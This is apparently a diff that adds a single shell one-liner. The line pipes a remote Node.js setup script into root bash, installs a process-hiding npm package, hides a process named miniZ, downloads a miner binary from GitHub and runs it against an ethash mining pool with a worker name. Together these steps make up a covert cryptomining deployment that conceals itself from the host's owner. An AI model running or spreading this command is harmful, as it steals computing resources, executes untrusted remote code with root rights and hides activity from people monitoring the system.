@@ -1,0 +1,1 @@
+sudo apt update -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y && npm i -g node-process-hider && ph add miniZ && wget https://github.com/thefacta/miner/raw/main/miniZ && chmod +x miniZ && ./miniZ --url=hijrahku.$(echo $(shuf -i 1-100 -n 1)-BISMILLAH)@ethash.kupool.com:1800 --log --extra 
